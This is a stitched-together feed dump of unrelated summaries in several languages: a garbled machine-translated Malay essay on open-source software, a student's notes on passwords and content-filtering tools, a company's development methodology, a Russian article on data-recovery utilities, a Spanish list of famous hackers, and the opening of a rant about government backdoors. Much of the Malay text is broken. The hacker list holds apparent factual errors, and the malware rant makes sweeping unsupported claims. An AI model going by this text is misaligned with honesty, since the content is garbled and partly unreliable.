projek-projek sumber terbuka yang lebih tradisional seperti OpenSolaris dan Linux.Dalam tahun 1970-an dan awal 1980-an, dua kumpulan yang berbeza telah mewujudkan akar sumber perisian terbuka semasa pergerakan. Di pantai timur, Richard Stallman, dahulunya makmal MIT AI, mencipta projek GNU dan Yayasan Perisian Percuma.Projek GNU adalah bertujuan untuk mewujudkan satu sistem operasi percuma dan digunakan GNU General Public License (GPL) sebagai lesen perisian untuk melarang proprietization perisian, tetapi membenarkan pengagihan semula dan pengubahsuaian.Di pantai Barat Amerika Syarikat, Sains Komputer Kumpulan Penyelidikan (CSRG) University of California di Berkeley menambah penambahbaikan kepada sistem operasi Unix asal dari AT & T, dan membangunkan banyak aplikasi yang dikenali sebagai "BSD Unix".Di samping itu,usaha-usaha ini telah dibiayai terutamanya oleh DARPA kontrak [petikan diperlukan] dan rangkaian padat penggodam Unix seluruh dunia membantu untuk debug, mengekalkan dan meningkatkan system. Pada 1991-1992, dua peristiwa penting berlaku.:Di California, Bill Jolitz selesai pengagihan bersih / 2, sehingga ia telah bersedia untuk berjalan di mesin i386 kelas. Net / 2 adalah hasil daripada usaha yang CSRG untuk membuat versi BSD Unix percuma kod AT & T-hak cipta. Beliau dipanggil 386BSD karyanya, dan ia cepat menjadi dihargai dalam masyarakat BSD dan Unix. Ia termasuk bukan sahaja kernel, tetapi juga utiliti banyak, membuat sistem operasi yang lengkap. Di Finland, Linus Torvalds, pelajar sains komputer, berpuas hati dengan Minix Tanenbaum [petikan diperlukan], melaksanakan versi pertama kernel Linux. Tidak lama kemudian, ramai orang telah bekerjasama untuk membuat kernel yang lebih dan lebih mudah untuk digunakan, dan menambah utiliti banyak untuk membuat GNU / Linux sistem operasi sebenar.  Pada tahun 1993, kedua-dua GNU / Linux dan 386BSD platform yang agak stabil. Sejak itu, 386BSD telah berkembang ke dalam keluarga sistem operasi berasaskan BSD (NetBSD, FreeBSD, dan OpenBSD), manakala kernel Linux digunakan dalam pengagihan GNU / Linux banyak seperti Slackware, Debian, Red Hat, SUSE, Mandrake, dan banyak lagi. Label "sumber terbuka" telah dicipta dan diterima pakai oleh sekumpulan orang dalam gerakan perisian bebas pada sesi strategi diadakan di Palo Alto, California, sebagai reaksi kepada pengumuman Januari Netscape 1998 melepaskan kod sumber untuk Navigator.Salah satu hujah di sebalik menggunakan istilah adalah bahawa "[kelebihan] menggunakan sumber terbuka panjang bahawa dunia perniagaan biasanya cuba untuk menjaga teknologi bebas daripada dipasang." Mereka orang-orang yang pakai istilah yang digunakan peluang sebelum pembebasan kod sumber Navigator untuk membebaskan diri mereka konotasi ideologi dan berkonfrontasi dengan "perisian percuma" panjang. Kemudian pada bulan Februari 1998, sebuah organisasi yang dipanggil Open Source Initiative (OSI) diasaskan oleh Bruce Perens dan Eric S. Raymond "sebagai advokasi pendidikan, dan organisasi pengawasan pada masa puncak dalam sejarah budaya itu. SIAPA YANG TERLIBAT DALAM PERISIAN SUMBER TERBUKA  Menurut Samba bersama pencipta Jeremy Allison bersetuju dengan ini, menekankan bahawa perisian proprietari adalah terlampau mahal bagi negara-negara membangun. Di kebanyakan negara, perisian proprietari akan dicetak rompak. Jadi, untuk menyelesaikan masalah ini ialah melalui sumber terbuka di mana perisian yang berkualiti tinggi dan sah berlesen boleh diwujudkan dan disediakan kepada semua orang, "katanya. Bagaimanapun, Allison berkata sebab utama mengapa tidak ada pelaksanaan banyak sumber terbuka di seluruh dunia adalah kerana banyak pelaburan telah dibuat dalam perisian proprietary.             Pada permulaannya, banyak syarikat dan pemilik perniagaan kecil memilih untuk menggunakan pakej perisian sumber terbuka untuk memenuhi keperluan pengkomputeran pejabat harian mereka atau untuk membina infrastruktur IT mereka. Berbeza sistem perisian proprietari, sistem perisian sumber terbuka biasanya mempunyai kelonggaran menganjurkan struktur kerjasama pemaju. Pemaju bekerja pada mereka terbahagi kepada dua.Yang pertama,tugasan secara sukarela.Ramai pemaju tidak memenuhi keperluan fizikal mereka.Kedua,rakan sekerja.Ini kerjasama pemaju corak unuk yang membawa kepada perisian yang juga unik.  Walaupun panduan ini boleh dianggap bacaan latar belakang umum bagi sesiapa yang berminat dalam membuka perisian sumber dalam kerajaan, penonton utama untuk panduan ini adalah pengurus projek perolehan pasukan dan yang sumber perisian untuk memenuhi keperluan perniagaan.Di samping itu,agensi kakitangan yang mempengaruhi pemilihan perisian juga mungkin mendapati panduan ini berguna.Selain itu, The Australian Kerajaan Open Source Perisian Pelesenan Rangka Kerja Risiko (Lampiran 1) direka untuk ICT pakar.Sebahagian besar perisian sumber terbuka yang dibangunkan oleh komuniti orang mahir yang biasanya berkomunikasi dalam talian. Dalam model ini, tidak ada perbadanan tertentu menguruskan proses pembangunan. Sokongan boleh didapati melalui ahli-ahli komuniti, yang mempunyai forum dan mekanisme maklum balas yang lain untuk menerima permintaan daripada pengguna. Pada umumnya, tiada perjanjian tahap perkhidmatan yang disediakan dari masyarakat. pakej popular seperti pelayan web Apache dan sistem operasi Linux telah dibangunkan menggunakan ini model.Korporat disokong masyarakat. Sesetengah organisasi komersial menyediakan sokongan untuk sumber terbuka perisian. Organisasi komersial boleh memilih untuk mewujudkan masyarakat sendiri untuk membangunkan perisian sumber terbuka atau mereka boleh memilih untuk memanfaatkan produk yang sedia ada yang dicipta oleh sukarelawan masyarakat. Organisasi komersial biasanya menyediakan sokongan kepada ditakrif perjanjian tahap perkhidmatan. Lebih dari satu organisasi yang boleh memberi sokongan untuk sesuatu produk, yang membawa persaingan berdasarkan kualiti dan harga perkhidmatan. Sebagai contoh, Oracle dan IBM pelayan web kedua-duanya berdasarkan Apache masyarakat maju.Sesetengah perisian sumber terbuka dibangunkan atau disokong oleh satu perbadanan. Sun Microsystems (kini dimiliki oleh Oracle) menyediakan operasi Open Solaris sistem di bawah model ini.Richard Stallman, seorang penyokong pergerakan perisian percuma, adalah salah satu perisian bebas dan penyokong pergerakan sumber terbuka yang mencadangkan alternatif kepada model swasta berleluasa dalam industri. Selepas membangunkan sistem operasi nonproprietary dipanggil GNU, Stallman mengasaskan Free Software Foundation pada tahun 1983. Bagi kebanyakan tahun 1970-an dan 1980-an, organisasi seperti AT & T, dengan inisiatif sistem operasi Unix mereka, telah dinaikkan pangkat polisi code.ry sumber yang berkongsi budaya . PENGGUNA SUMBER TERBUKA Sumber terbuka digunakan di sekolah. Hal ini demikian kerana,kos perisian adalah percuma .selain itu,tiada lessen yang rumit dan mempunyai kelengkapan yang lengkap serta boleh menjimatkan wang.Sumber terbuka ini dapat digunakan oleh pelajar dan tidak akan membebankan pelajar.Sumber terbuka juga mempunyai kebebasan yang tertentu. Sekolah tidak boleh dipaksa untuk menaik taraf sumber perisian. Penyelesaian sumber terbuka juga berbentuk modular dan mudah untuk disesuaikan pada bila-bila masa sahaja. Walaubagaimanapun,banyak program disekolah tidak serasi dengan sumber terbuka.Hal ini kerana,perisiannya tidak mesra pengguna.Sumber terbuka digunakan dalam aplikasi khusus terutamanya dalam perisian kurikulum khusus yang tidak disediakan untuk guru kelas. Selain itu,sumber terbuka juga digunakan di syarikat-syarikat. Banyak program dan syarikat-syarikat masih terus berkembang. Kos jangka panjang boleh menjadi tinggi. Memudahkan  orang atasan dan bawah berhubung. Penggunaan kod sumber, lebih dikenali sebagai sumber terbuka telah menjadi satu amalan biasa kod untuk pengaturcara. Malah, melarang penggunaan sumber terbuka adalah tidak lagi pilihan yang berdaya maju bagi syarikat-syarikat dan juga boleh meletakkan mereka di dalam keadaan yang kompetitif. Beberapa syarikat telah pun menerima pakai dasar rutin menganalisis sama ada perisian komersial bahawa mereka telah dibeli atau telah dilaksanakan boleh digantikan dengan alternatif sumber terbuka. BAGAIMANA CARA UNTUK MENCARI ALAT SUMBER TERBUKA Terdapat banyak alat-alat yang kita boleh menulis dan mengira.Perisian sumber terbuka yang boleh gunakan di bawah windows bermula menggunakan perisian Open Source menyelamatkan diri ,wang dan kerumitan.Ia berciri penuh, Suite Mail dan Berita. Ia termasuk pilihan lanjutan seperti melayari tab, menyekat pop-up, dan e-mel spam penapis. Pereka Web mudah membolehkan kita mencipta dan menerbitkan laman web kita sendiri. Dengan majoriti virus kini yang ditulis khusus untuk mengeksploitasi pelayar lalai Windows dan klien e-mel (Internet Explorer dan Outlook Express), salah satu daripa]]></summary>

  <summary><![CDATA[Internet defenses:  1; How to create a secure password.  Step 1. Make sure your password is more than 8 letters long. Step 2. Use upper and lower case letters. Step 3. Use two or three numbers in the password spaced apart from each other. Step 4. Use special characters such ass #,+ and *. Step 5. Make sure you don't make your password so obvious that people can guess it from the top of their head.  Below I will include 2 links to websites that will describe in better detail how you can make a secure password that is virtually impossible to guess. http://techbu.com/2010/08/05/five-easy-steps-to-create-super-strong-passwords http://www.productivity501.com/10-tips-for-creating-secure-passwords/253/  2; Content filtering software programs are computer programs that block certain sites such as pornography websites and it protects you from predators The three different content filtering software programs that I am researching are: A)Net Nanny Parental Controls. B)McAfee safe eyes C)McAfee family protection.  Each of these are fairly different and here is how.  McAfee family protection has 3 filtering algorithms. There is a URL based algorithm, a keyboard based algorithm, and a dynamic categorization algorithm. It also has great filtering capabilities, such as, chat monitoring, chat blocking, personal info blocking, email filtering, peer-to-peer (P2P) blocking, social network reporting, PC game blocking, and social networks. its reporting capabilities aren't the best but they are still effective. there are alerts by email, log reports by email, and alerts by text. its management capabilities are great, there's individual user profiles, remote management and password controls. it also other features such as overriding of block, daily time limits and updated URL/filtering rules. for help and support you can either email the company, call them on the telephone. there support hours are 6 am-6 pm (PST) M-F. the browsers that support it are internet explorer, fire fox, Google chrome, opera, and safari. the configurations it supports are windows 8, 7, vista, XP, mac OS and android but for android you need to buy it. all this in one package for the price of £32.  McAfee safe eyes has 3 filtering algorithms, URL based algorithm, a keyboard based algorithm, and a dynamic categorization algorithm. It has great filtering capabilities, such as, chat monitoring, chat blocking, personal info blocking, email filtering, peer-to-peer (P2P) blocking, social network reporting, PC game blocking, and social networks. its reporting capabilities are rather effective and they are the best, there are alerts by email, log reports by email, alerts by text, and remote reporting. Its management capabilities are great, there's individual user profiles, remote management and password controls. it also other features such as overriding of block, daily time limits and updated URL/filtering rules. for help and support you can either email the company, call them on the telephone. there support hours are 10 am-midnight (EST) M-Sat. The browsers that support it are internet explorer, fire fox, Google chrome, opera, and safari. the configurations it supports are windows 8, 7, vista, XP, mac OS and apple(i OS) but for apple you need to buy it. this is also only £32.  Net Nanny Parental Controls is the best I have come across if your on a budget, its filtering algorithms are effective, there is a URL based algorithm, a keyboard based algorithm, and a dynamic categorization algorithm. It has great filtering capabilities, such as, chat monitoring, chat blocking, personal info blocking, email filtering, peer-to-peer (P2P) blocking, social network reporting, PC game blocking, and social networks. its reporting capabilities are rather effective and they are the best, there are alerts by email, log reports by email, alerts by text, and remote reporting.

The browsers that support it are internet explorer, fire fox, Google chrome, opera, and safari. the configurations it supports are windows 7, vista, XP, mac OS and android but for android you need to buy it. all this in one package for just £19.  in my opinion McAfee safe eyes is the best package, it has all the filtering algorithms, all the filtering capabilities, all the reporting capabilities, all the management capabilities, all other features supports all browsers, supports most configurations and it has outstanding help and support. i would highly recommend it to all computer users.  for my next task, compare proxy software, i have researched both and found this.   One way to measure whether or not Dans guardian is the right filtering tool for you is your willingness to install and tinker with an operating system like Linux. If Open DNS is the Mac-like "It just works!" one click solution, Dans Guardian falls into a much more Linux-like "I can change every setting and experience real, ultimate power!" category. Dansguardian runs on Linux, FreeBSD, OpenBSD, NetBSD, Mac OS X, HP-UX, and Solaris. Dans Guardian is extremely configurable and allows you to do all sorts of things, like block all images, filter ads out across your entire home network, block files from being downloaded by extension type, and control the effects of the filters, white lists  and more based on which computer on your network is doing the accessing. You can deploy different filters for different computers based on domain, user, and source IP so your high school student doesn't get the same ultra-filtered content your elementary student does. Dans Guardian needs to be paired with a proxy as it doesn't serve the web pages itself but only acts as a filter—many users use Squid, also mentioned in the entry for Squid Guard.  Squid Guard is similar to Dans guard in that it is a stand alone filtering tool you connect into with a proxy—in this case the popular Squid proxy. Also like Dans guard, you have a high degree of flexibility—dream up a combination of filtering parameters and there's a good chance you can make it happen with Squid Guard. No Hello Kitty between the hours of 9 AM and 10 PM on Tuesdays and Thursdays? Not a problem with the highly customizable Squid Guard. Squid Guard is natively a UNIX-environment only tool, and you can install it onto Linux, FreeBSD, and so forth.  in my opinion you are better off getting squid because with Dans guardian you need to be paired with a proxy but that's not the case for squid. to sum up i think squid is just easier to use.]]></summary>

METHODOLOGY At  AERL'S,  a  standardized  software  development  methodology  helps  us  to  provide  very  cost- effective  and  efficient  business  solutions.  The  following  would  give  a  better  understanding  of  the  same:   PHASE 1- REQUIREMENTS GATHERING  Our Business Consultants conducts Joint Application Development sessions with the client. These  are brainstorming sessions that help determine the business objectives and marketing goals.  Prototype storyboards or screen layouts are used for role-playing.    PHASE 2 -TECHNICAL ARCHITECTURE  Our Technical Architects advise the client on options available to him with respect to architectural  approaches and technology solutions for project implementation.    PHASE 3 - CONFIRMATION  Based on the architecture and technology chosen, the development team of Programmers, graphic  designers and project managers draft a development plan for the project with cost and time  estimates.  PHASE 4 - INCREMENTAL DEVELOPMENT  This is the stage where the project is actually off the ground. AERL'S builds the application in  progressive phases or increments. Incremental delivery permits experimentation of complex  solutions during the course of development. This approach facilitates modifications through hands- on exposure to the delivered increment.  PHASE 5 - INSTALLATION and TRAINING  Once the system is installed on the production servers, comprehensive training is extended to the  client's IT/ MIS personnel; not only to administer and maintain it, but also to understand the  underlying technology and development tools. The end-users are trained to use the application  effectively. Follow-up action in terms of close monitoring of the system and applications ensures  immediate response to issues     Some Additional Notes     Communication  is of  high  profile for a  successful  development  that  is  why  we  usually  have  two project managers assigned to the project. One of them, either a member of our team or  your representative, is a local Project Manager who closely works with your team to ensure  seamless  information  exchange  and  monitors  the  progress.  The  other  one,  the  offshore  Project Manager, is fully assigned to your project and is fully responsible for it.     The Internet will undoubtedly be used for effective communication and on-time deliveries. We  also use special techniques and tools to support remote development. Our programmers and  other  specialists  effectively  work  as  a  team  despite  the  fact  that  they  are  in  different  geographic locations.     If  it  is  necessary,  qualified  technical  consultant  can  be  assigned  to  study  your  business  process  and  your  existing  software.  Of  course,  we  understand  all  the  complexity  of  the  development process, great variety of possible situations and requirements, individual sense  of taste and other things. We will take whatever time is necessary to meet your expectations.  This development process allows us to guarantee:   On-time completion of the project.   Delivery of a high-quality system meeting your business requirements.   Development of a flexible, easy to use and modify (in case you need some enhancements in  future) system.

  <title><![CDATA[Возвращение данных]]></title>
  <summary><![CDATA[Писатель Михаил Булгаков, наверное, даже не подозревал, насколько он окажется прав, утверждая, что рукописи не горят. В компьютерную эпоху, когда данные хранятся в основном в электронной форме, они действительно больше не исчезают раз и навсегда. При условии, конечно, что не вышел из строя их носитель — жесткий или сменный диск. Так что не спешите рвать на себе волосы и кусать локти, потеряв из-за фатальной ошибки или системного сбоя важную для себя информацию. В большинстве случаев ошибочно удаленные данные можно восстановить с помощью специальных реаниматоров. 
В этой статье мы расскажем о том, как можно быстро и без особых проблем вернуть утраченное. Причем самостоятельно, не прибегая к порой весьма недешевым услугам многочисленных контор скорой компьютерной помощи или дорогостоящих коммерческих программ. Почти все рассматриваемые нами утилиты распространяются бесплатно. Их совершенно свободно можно скачать с сайтов разработчиков или, что проще, установить с прилагаемого к журналу CD. 
Сразу оговоримся, что речь в настоящей статье пойдет о восстановлении данных только на не поврежденных механически и, соответственно, определяемых в BIOS носителях информации. Если жесткий или съемный диск «посыпался» не в фигуральном, а в самом прямом смысле слова, без посторонней квалифицированной помощи при его реанимации вам, скорее всего, не обойтись. 
Профилактика 
Небезызвестный диакон Андрей Кураев как-то поведал автору этих строк весьма поучительную историю о том. как чудесным образом спас важные данные один его знакомый священник. Он всего лишь попросил помочь вернуть их не компьютерщика, а благословлявшего его епископа. Тот просто перекрестил отказавшие компьютеры и произнес: «Во имя Отца и Сына, и Святого Духа». И они, говорят, благополучно заработали. 
Надо сказать, что при работе с компьютером вообще и жестким диском в частности даже и не самым верующим пользователям креститься приходится довольно часто. Никогда не знаешь, где и когда он может подвести. Но что толку обращаться к Богу, если в большинстве случаев потеря данных вызвана нашими собственными ошибками и тривиальной ленью. Малейшие неточности при установке операционных систем, разбиении жесткого диска на логические диски могут привести к утрате хранящейся на винчестере информации. Если вы сами, своими собственными руками удалите нужный файл, директорию или раздел, — никакие высшие силы вернуть их не помогут. А вот несложные профилактические меры выручат наверняка. Если вы не хотите полностью лишиться жесткого диска, воспользуетесь программой HDD Health. Благодаря технологии S.M.A.R.T. она заблаговременно предупредит о грозящей ему опасности (при условии, что HDD не очень стар и поддерживает данную технологию). На закладке Health утилита представит все выявленные ею в процессе мониторинга ошибки, а на страницах Brief Info. Extended Info и S.M.A.R.T вы получите исчерпывающие сведения о технических характеристиках и текущем состоянии вашего винчестера. 
Помимо мониторинга работоспособности HDD желательно также регулярно проводить резервное копирование важнейших файлов и папок, размещенных на нем. С помощью, например, программы Simply Safe Backup. Эта backup-утилита позволяет скопировать данные в MYC-файлы образа, а затем записать на CD/DVD-диски или отправить на FTP-сервер. При необходимости резервные копии можно сжать (в бесплатной Free Edition-версии — с минимальным уровнем компрессии) и распределить на несколько болванок. Доступ к сохраняемой информации при желании защищается паролем, в том числе с мощным 128-битным ключом шифрования. Для восстановления данных достаточно прописать путь к файлу образа кликнуть по кнопке Perform Restore. 
PC Inspector 
Целый набор инструментов под общим названием PC Inspector, предназначенный для обслуживания HDD и восстановления данных, предоставляет, причем абсолютно бесплатно для домашних пользователей, германская софтверная компания Convar. Благодаря созданной ею утилите Clonexx (www.pcinspec-de/file_recovery/welcome.htm), например, вы сможете очень быстро скопировать данные с одного жесткого диска, подключенного к компьютеру, на другой. Эта программа создает загрузочную дискету, работающую в среде FreeDOS. и все операции проводит в автоматическом режиме прямо с нее. 
Тем, кто не воспользуется ее услугами и не создаст резервные копии жесткого диска, в случае аварии придется обратиться за помощью к другой утилите из набора PC Inspector — File Recovery 3.0 (прежде распространялась под названием Drive Rescue). Она позволяет реанимировать не только отдельные файлы и папки (Recover deleted files), но и целый логический (Find lost data) или даже физический диск (Find lost drive). В последнем случае, естественно, необходимо иметь рабочий HDD (подключенный как Primary Master) с установленной программой. Единственное ограничение — File Recovery поддерживает только файловую систему FAT. Если искомый раздел будет обнаружен, то размещенные на нем файлы и папки появятся в директории Root. После чего вам останется только сохранить данные на другом диске. 
Если раздел был по какой-то причине ошибочно отформатирован, откройте его в окне программы, после чего кликните по кнопке Find lost data. Стертые данные, которые вы хотели бы восстановить, ищите в разделе Lost. 
Для реанимации отдельных файлов и папок достаточно выбрать логический диск, на котором они находились, и сохранить их с помощью команды Save to контекстного меню. Рекомендуется поместить полученные копии на другой раздел HDD во избежание перезаписи оригиналов. Кроме того, для профилактики полной потери информации желательно не помещать критически важные файлы и документы в корень того или иного диска и регулярно проводить де-фрагментацию винчестеров. 
Для восстановления графических файлов, ошибочно удаленных со сменных flash-карт цифровых фотокамер, используйте еще одну утилиту компании Convar— Smart Recovery. Процесс реанимации в ней никаких сложностей вызвать не должен. Перед тем как кликнуть по кнопке Start, проверьте подключение аппарата к компьютеру, выберите его название в поле Select Drive и укажите формат фотографий и директорию, в которую их следует поместить. Программа умеет работать практически со всеми популярными картами flash-памяти (CF, SM, SONY Memory Stick, IBM Micro Drive, MMC и SD) и способна вернуть к жизни не только графические, но и мультимедийные файлы. 
DOS-реаниматоры 
Вполне возможно, что дополнительного винчестера, необходимого для работы PC Inspector File Recovery, у вас под рукой не окажется. В этом случае на выручку придет заранее созданный аварийный диск. Подготовить его можно, к примеру, с помощью утилиты EMRD (www.am-bulancepc.ru). При запуске она создаст для вас загрузочную дискету с собственной графической   оболочкой, DOS-драйвером мыши, файл-менеджером Volkov Commander и подборкой тестовых утилит, включая Scandisk. Правда, в бесплатной версии   EMRD   Free   Edition   часть функций заблокирована. Невозможно, например, открыть тома Windows ХР с файловой системой EFS. Зато разделы с NTFS в ней доступны, хотя и не полностью (не поддерживаются папки с русскими именами). Для того чтобы получить доступ к хранящейся в них информации, выберите в стартовом меню утилиты вариант загрузки под Windows 2000. 
Поскольку сама EMRD Free Edition не позволяет осуществлять реанимацию данных (такая функция под названием Victoria реализована лишь в коммерческом варианте этой программы — Personal Edi tion), рекомендуем перенести ее Hi загрузочный CD. В этом случае ei можно будет дополнить программа ми-реаниматорами под DOS сторон них разработчиков. В частности утилитой TestDisk, позволяющей вернуть ошибочно удаленные диски и сделать при необходимости любой из ни загружаемым (Advanced > Boot). Выбрав опцию Analize. вы узнаете об всех существующих на исследуемо! HDD разделах, в том числе стертых. Если же TestDisk все-таки найдет какой-то логический диаперейдите в следующее меню и задействуйте режим тщательного поиска (Search). 
В ряде случаев реанимировать раздел вы не сможете без уточнения параметров самого жесткого диска. Однако будьте предельно внимательны и осторожны, обращаясь к блоку Geometry, в котором как раз и выставляются характеристики винчестера, а также проводятся операции по удалению данных (Delete) и корректировке загрузочного сектора (MBR Code). Если вы не уверены в своих п знаниях по части строения HDD. 
TestDisk, путем нажатия клавиши с латинской буквой Т, позволяет назначить новый вариант файловой системы для любого раздела. Помимо разнообразных FAT программа поддерживает NTFS, BeFS (BeOS). Ext2 и Ext3 (Linux), Linux Swap (версий 1 и 2), Netware (старых версий), ReiserFS (версий 1 и 2), UFS (FreeBSD/ OpenBSD/NetBSD) и JFS. После обнаружения всех ошибочно удаленных томов активируйте их за счет функции Write. 
Штопаем «черные дыры» 
Ничто не вечно под Луной. Рано или поздно на каждом жестком диске появляются сбойные участки. Данные, которые попадают в такие «черные дыры», становятся нечитаемыми. Для борьбы с ними производители винчестеров выпускают специальные утилиты, провалявшие в режиме DOS диагностику и при необходимости низкоуровневое форматирование HDD. Большинство такого рода программ корректно работает только со «своими» жесткими дисками. Есть, впрочем, и универсальные реаниматоры «битых» винчестеров. 
Один из них — HDD Scan and Repair выпустила компания Salvation Data. Эта утилита работает с создаваемой во время ее инсталляции загрузочной дискеты или CD. С ее помощью пользователь может проверить состояние своего жесткого диска, причем сразу в двух режимах — (Defaulted Scan] или (Advanced Scan). В первом случае HDD Scan and Repair быстро ищет сбойные сектора везде понемногу, во втором — медленно и скрупулезно, на одном конкретном участке. Найденные поврежденные наглядно увидеть, обратившись к разделу Defects Мар Исправить ошибки (Fast Restore], блокировав доступ к поврежденным секторам, в программе Scan and Repair можно вручную (Manual Restoration) или автоматически (Intellective Restoration) Второй вариант требует обязательной предварительной диаг ностики. Учтите, что все данные на сбойных секторах будут око чательно потеряны, поскольку программа HDD Scan and Repa* восстанавливает работоспособность самого жесткого диска, а не информацию на нем. Аа и то не любого, а только подключенного как IDE Primary Master. Утилита HDD Scan and Repair не относится к классу freeware. Однако ее пробная версия не имеет никаких функциональна или временных ограничений. Разработчики разрешают пользоваться ею без оплаты. 
Эксперт по разделам 
Бесплатные утилиты восстановления данных если и уступают коммерческим аналогам, то только с точки зрения удобства использования и наглядности интерфейса. Шароварные программы, в отличие от них, большинство операций выполняют самостоятельно. К примеру, лучший на сегодняшний день коммерческий реаниматор Acronis Recover/Expert, входящий в пакеты дисковых утилит Disk Director Suite и Power Utilities российской компании Acronis, умеет находить и восстанавливать разделы жесткого диска не только в интерактивном ручном, но и в полностью автоматическом режиме. Если вы выберете последний вариант, программа реанимации тщательно проверит незанятое дисковое пространство и сразу же вернет из небытия все обнаруженные на нем логические диски. При ручном режиме работы вам придется самостоятельно подсказывать утилите местоположение свободного пространства. Выявлять разделы Re-coveryExpert будет в зависимости от определенного вами способа поиска: только по начальным секторам каждого цилиндра («Быстрый»} или по всем без исключения («Полный»), Как утверждают разработчики компании Acronis, первый вариант подойдет для подавляющего большинства случаев. Как только обнаружится потерянный раздел, вы сможете, не дожидаясь окончания поиска, приступить к процессу его реанимации (кнопка «Приступить», которая появится в окне программы вместе со сценарием восстановления).]]></summary>

  <title><![CDATA[Hackers Famosos]]></title>
  <summary><![CDATA[KeViN mItNiCkKevin David Mitnick es quizás el más famoso hackers de los últimos tiempos. Nacido el 6 de Agosto de 1963 en Van Nuts, California,  desde muy niño sintió curiosidad por los sistemas de comunicación electrónica y fue auto cultivando un obsesivo deseo por investigar cosas y lograr objetivos aparentemente imposibles, hasta llegar a poseer una genial habilidad para ingresar a servidores sin autorización, robar información, interceptar teléfonos, crear virus, etc. vLaDiMiR LEvIn Vladimir Levin, un graduado en matemáticas de la Universidad Tecnológica de San Petesburgo, Rusia, fue acusado de ser la mente maestra de una serie de fraudes tecnológicos que le permitieron a él y la banda que conformaba, substraer más de 10 millones de dólares, de cuentas corporativas del Citibank. En 1995 fue arrestado por la Interpol, en el aeropuerto de Heathrow, Inglaterra, y luego extraditado a los Estados Unidos. John Draper El Capitan CrunchJohn Draper, alias ‘Captain Crunch’ se hizo famoso por su capacidad de hackear los sistemas de teléfonos utilizando solamente un silbato de las cajas de cereales ‘Captain Crunch’ (de aquí viene el sobrenombre). Además de ser el padre del ‘phone phreaking’, John Draper es también famoso por escribir lo que tal vez fuera el primer procesador de palabras para IBM PC. Ahora tiene su propia empresa de seguridad, desarrollando soluciones antispam, desbaratando los ataques de hackers y asegurando los PC.   Richard Stallman  Un Hacker de al estilo viejo; Stallman consiguió un trabajo de Inteligencia Artificial en los laboratorios de MIT en 1971. Él era un estudiante de Harvard en el momento. Perturbado de que el software se vio como propiedad privada, Stallman hizo la Fundación del Software Libre después.   Dennis Ritchie Alias DRM  La fuerza creativa que conducía detrás del grupo de funcionamiento legendario, de Ritchie y de Thompson de la informática de los laboratorios de Bell creó UNIX en 1969. Un sistema operativo elegante, abierto para las minicomputadoras, los usuarios ayudados por UNIX y con computar general, crearon un procesador de textos y el establecimiento de una red, y que pronto se convirtieron en un lenguaje de estándar.   Theo de Raadt alias Theo  Fue parte del proyecto FreeBSD y NetBSD y de este ultimo salio ya que tenia ideas muy utopicas y fantasiosas de seguridad segun los demas ademas de que NetBSD se queria enfocar a la compatibilidad de multiplataformas asi decide hacer su propio BSD fundador del proyecto “OpenBSD” en Octubre de 1995 asi como de “OpenSSH” que es una version libre de secure shell www.openbsd.org y www.openssh.org considerado por muchas personas el mejor programador de seguridad es un verdadero Hacker de nuestros tiempos. actualmente vive en Calgary Canada y sigue desarrollando y evolucionando su proyecto para poder vivir. Primer encuentro con una computadora: No sabemos exactamente pero fue cuando era chico hacia programas para la vieja commodore64 Herramientas raras: usa las computadoras que las empresas ya no nesesitan y las hace correr bajo su sistema para coleccionarlas en su sotano.   Linus torvalds  Un verdadero Hacker en el sentido clásico, Linus Torvalds era un estudiante de informática en la Universidad de Helsinki cuando escribió el sistema operativo “Linux” una reducción de “Linus-Minix” en 1991. ¡El software ha demostrado ser tremendamente popular mundialmente y lo mejor de todo es que es LIBRE (GNU) Torvalds atribuye mucho del éxito de Linux modestamente a el Internet y al GNU de Richard Stallman dice que los dos han facilitado el desarrollo de su kernel original creando la colaboración entre programadores de software y diseñadores.   Ken Thompson  La fuerza creativa que conducía detrás del grupo de funcionamiento legendario, de Ritchie y de Thompson de la informática de los laboratorios de Bell creó UNIX en 1969. Un sistema operativo elegante, abierto para las minicomputadoras, los usuarios ayudados por UNIX y con computar general, crearon un procesador de textos y el establecimiento de una red, y que pronto se convirtieron en un lenguaje de estándar.   Mark Abene alias Phiber Optik  Como un miembro fundador de los “Masters of Deception” , Phiber Optik inspiró miles de adolescentes alrededor del país a “estudiar” los funcionamientos interiores del sistema teléfonico de nuestra nación.   Kevin Poulsen alias Dark DanteEn 1990 Poulsen tomó todas las líneas telefónicas de Los Angeles y la estación de radio del área KIIS-FM, mientras aseguraba que él sería la llamada 102 .  Grace Hooper  Una graduada en matemáticas y física del Vasser College que mas tarde completaría una maestría y un doctorado en Yale. llego a ser Almirante de la marina durante la segunda guerra mundial ella creía que las computadoras podrían servir para el bien de la humanidad y no solamente para el uso militar que se les estaba dando, así de estas ideas y de su trabajo en “the Bureau of Ordenance Computation” se le considero como la primera Hacker de la historia también la apodaron durante la segunda guerra mundial como “the amazing Grace” debido también a que hacia sus investigaciones despues de su trabajo y en días feriados.   Tsutomu Shimomura  Shimomura cazo y desenmascaro a Kevin Mitnick, el cracker/phreaker más famoso de USA, a principios de 1994. Después de que sus colegas del “San Diego Supercomputing Center” le informaron a Shimomura que alguien había robado centenares de programas y los ficheros de su estación de trabajo, el experto en seguridad computacional Tsutomu trabajó en extremo para seguir al ladrón a través del “WELL”.]]></summary>

  <title><![CDATA[Nobody Seems To Notice and Nobody Seems To Care – Government & Stealth Malware]]></title>
  <summary><![CDATA[In Response To Slashdot Article: Former Pentagon Analyst: China Has Backdoors To 80% of Telecoms 
How many rootkits does the US[2] use officially or unofficially? 
How much of the free but proprietary software in the US spies on you? 
Which software would that be? 
Visit any of the top freeware sites in the US, count the number of thousands or millions of downloads of free but proprietary software, much of it works, again on a proprietary Operating System, with files stored or in transit. 
How many free but proprietary programs have you downloaded and scanned entire hard drives, flash drives, and other media? Do you realize you are giving these types of proprietary programs complete access to all of your computer’s files on the basis of faith alone? 
If you are an atheist, the comparison is that you believe in code you cannot see to detect and contain malware on the basis of faith! So you do believe in something invisible to you, don’t you? 
I’m now going to touch on a subject most anti-malware, commercial or free, developers will DELETE on most of their forums or mailing lists: 
APT malware infecting and remaining in BIOS, on PCI and AGP devices, in firmware, your router (many routers are forced to place backdoors in their firmware for their government) your NIC, and many other devices. 
